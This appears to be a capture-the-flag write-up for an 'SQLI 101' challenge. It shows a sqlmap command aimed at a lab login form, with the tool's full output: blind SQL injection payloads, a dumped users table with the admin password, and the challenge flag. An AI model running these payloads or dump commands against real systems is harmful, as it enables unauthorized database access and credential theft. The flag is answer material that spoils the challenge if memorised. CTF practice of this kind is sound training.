# SQLI 101
Used sqlmap to bruteforce it using username and password parameters   
```sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ```      
``FLAG-VTjo1lpqGRcHdtD5r02e73Dq4jrnusXn``

Here's what happened:
```
> sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:48:03 /2025-05-16/

[21:48:03] [INFO] resuming back-end DBMS 'sqlite' 
[21:48:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: password=admin&username=admin' AND 7771=7771 AND 'RHRM'='RHRM

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: password=admin&username=admin' AND 8747=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'cDjI'='cDjI
---
[21:48:03] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: SQLite
[21:48:03] [WARNING] on SQLite it is not possible to get name of the current database
[21:48:03] [INFO] fetching tables for database: 'SQLite_masterdb'
[21:48:03] [INFO] fetching number of tables for database 'SQLite_masterdb'
[21:48:03] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:48:03] [INFO] retrieved: 2
[21:48:04] [INFO] retrieved: fl4G_1s_H3re
[21:48:06] [INFO] retrieved: users
[21:48:07] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)
[21:48:18] [INFO] fetching entries for table 'users'
[21:48:18] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[21:48:18] [INFO] retrieved: 1
[21:48:18] [INFO] retrieved: 1
[21:48:19] [INFO] retrieved: FLABbergasted!
[21:48:20] [INFO] retrieved: admin
Database: <current>
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | FLABbergasted! | admin    |
+----+----------------+----------+

[21:48:21] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/jaycee/.local/share/sqlmap/output/chal4.hackademy.ctf/dump/SQLite_masterdb/users.csv'
[21:48:21] [INFO] retrieved: CREATE TABLE fl4G_1s_H3re (apprentice_flag TEXT NOT NULL)
[21:48:27] [INFO] fetching entries for table 'fl4G_1s_H3re'
[21:48:27] [INFO] fetching number of entries for table 'fl4G_1s_H3re' in database 'SQLite_masterdb'
[21:48:27] [INFO] retrieved: 1
[21:48:27] [INFO] retrieved: FLAG-VTjo1lpqGRcHdtD5r02e73Dq4jrnusXn (1/2). If you don't already have, try to bypass the login ^C
[21:48:39] [WARNING] Ctrl+C detected in dumping phase                                                         
Database: <current>
Table: fl4G_1s_H3re
[0 entries]
+-----------------+
| apprentice_flag |
+-----------------+
+-----------------+

[21:48:39] [INFO] table 'SQLite_masterdb.fl4G_1s_H3re' dumped to CSV file '/home/jaycee/.local/share/sqlmap/output/chal4.hackademy.ctf/dump/SQLite_masterdb/fl4G_1s_H3re.csv'
[21:48:39] [INFO] fetched data logged to text files under '/home/jaycee/.local/share/sqlmap/output/chal4.hackademy.ctf'
[21:48:39] [WARNING] your sqlmap version is outdated

[*] ending @ 21:48:39 /2025-05-16/
```
